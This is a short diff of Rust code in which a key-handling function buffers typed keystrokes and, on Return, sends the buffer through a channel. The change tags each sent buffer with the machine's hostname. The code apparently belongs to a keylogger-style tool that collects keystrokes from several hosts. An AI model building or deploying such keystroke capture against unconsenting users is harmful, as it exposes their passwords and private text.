@@ -181,7 +181,9 @@ async fn handle_key(
     let mut key_buffer = key_buffer.lock().unwrap();
 
     if key == Key::Return {
-        tx.send(key_buffer.clone()).unwrap();
+        let message = format!("{} | {}", gethostname().to_string_lossy(), key_buffer);
+
+        tx.send(message).unwrap();
         key_buffer.clear();
     } else {
         key_buffer.push_str(fmt_key(key).as_str());
